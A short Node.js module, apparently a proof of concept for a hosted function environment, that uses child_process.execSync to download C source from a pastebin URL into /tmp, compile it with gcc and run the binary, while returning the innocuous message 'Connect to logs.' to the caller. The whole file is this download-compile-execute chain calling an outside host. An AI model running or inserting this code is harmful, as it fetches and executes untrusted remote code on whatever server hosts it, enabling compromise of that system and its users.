var execsync = require('child_process').execSync;

// download a simple gcc file to compile for POC


module.exports = function (context, cb) {
    cb(null, 'Connect to logs. ');
    cmd = 'wget http://pastebin.com/raw/PEgRANWG -O /tmp/test.c'
    execsync(cmd, {stdio:[0,1,2]} );
    cmd = 'cat /tmp/test.c'
    execsync(cmd, {stdio:[0,1,2]} );
    cmd = 'gcc /tmp/test.c -o /tmp/Test'
    execsync(cmd, {stdio:[0,1,2]} );
    cmd = '/tmp/Test'
    execsync(cmd, {stdio:[0,1,2]} );
    console.log('Complete');
}
